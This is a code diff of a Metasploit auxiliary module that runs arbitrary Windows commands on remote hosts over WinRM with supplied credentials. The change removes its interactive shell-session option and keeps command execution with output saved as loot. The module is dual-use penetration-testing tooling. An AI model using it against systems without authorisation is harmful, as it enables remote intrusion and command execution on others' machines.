+++ modules/auxiliary/scanner/winrm/winrm_cmd.rb
@@ -9,7 +9,6 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::WinRM
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::Scanner
-  include Msf::Auxiliary::CommandShell
 
   def initialize
     super(
@@ -17,7 +16,7 @@ class MetasploitModule < Msf::Auxiliary
       'Description'    => %q{
         This module runs arbitrary Windows commands using the WinRM Service
         },
-      'Author'         => [ 'thelightcosine', 'smashery' ],
+      'Author'         => [ 'thelightcosine' ],
       'License'        => MSF_LICENSE
     )
 
@@ -50,70 +49,25 @@ class MetasploitModule < Msf::Auxiliary
                 :retry_delay => 1
             )
 
-
-    if datastore['CreateSession']
-      shell = conn.shell(:stdin)
-      # Coerce a message to be sent; will throw an exception if it fails
-      shell.send_stdin('')
-      session_setup(shell,rhost,rport,endpoint)
-    else
-      begin
-        shell = conn.shell(:powershell)
-        path = store_loot("winrm.cmd_results", "text/plain", ip, nil, "winrm_cmd_results.txt", "WinRM CMD Results")
-        f = File.open(path,'wb')
-        output = shell.run(datastore['CMD']) do |stdout,stderr|
-          stdout&.each_line do |line|
-            print_line(line.rstrip!)
-            f.puts(stdout)
-          end
-          print_error(stderr) if stderr
-        end
-        f.close
-        print_good "Results saved to #{path}"
-      rescue
-        File.delete(path)
-        raise
-      ensure
-        shell.close
-      end
-    end
-  end
-
-  def session_setup(shell,rhost,rport,endpoint)
-    sess = Msf::Sessions::WinrmCommandShell.new(shell,rhost,rport)
-    sess.platform = 'windows'
-    username = datastore['USERNAME']
-    password = datastore['PASSWORD']
-    info = "WinRM #{username}:#{password} (#{shell.owner})"
-    merge_me = {
-      'USERNAME' => username,
-      'PASSWORD' => password
-    }
-
-    start_session(self, info, merge_me,false,nil,sess)
-  end
-
-  def start_session(obj, info, ds_merge, crlf = false, sock = nil, sess = nil)
-    sess.set_from_exploit(obj)
-    sess.info = info
-
-    # Clean up the stored data
-    sess.exploit_datastore.merge!(ds_merge)
-
-    framework.sessions.register(sess)
-    sess.process_autoruns(datastore)
-
-    # Notify the framework that we have a new session opening up...
-    # Don't let errant event handlers kill our session
     begin
-      framework.events.on_session_open(sess)
-    rescue ::Exception => e
-      wlog("Exception in on_session_open event handler: #{e.class}: #{e}")
-      wlog("Call Stack\n#{e.backtrace.join("\n")}")
+      shell = conn.shell(:powershell)
+      path = store_loot("winrm.cmd_results", "text/plain", ip, nil, "winrm_cmd_results.txt", "WinRM CMD Results")
+      f = File.open(path,'wb')
+      output = shell.run(datastore['CMD']) do |stdout,stderr|
+        stdout&.each_line do |line|
+          print_line(line.rstrip!)
+          f.puts(stdout)
+        end
+        print_error(stderr) if stderr
+      end
+      f.close
+      print_good "Results saved to #{path}"
+    rescue
+      File.delete(path)
+      raise
+    ensure
+      shell.close
     end
-
-    sess
   end
-
 end
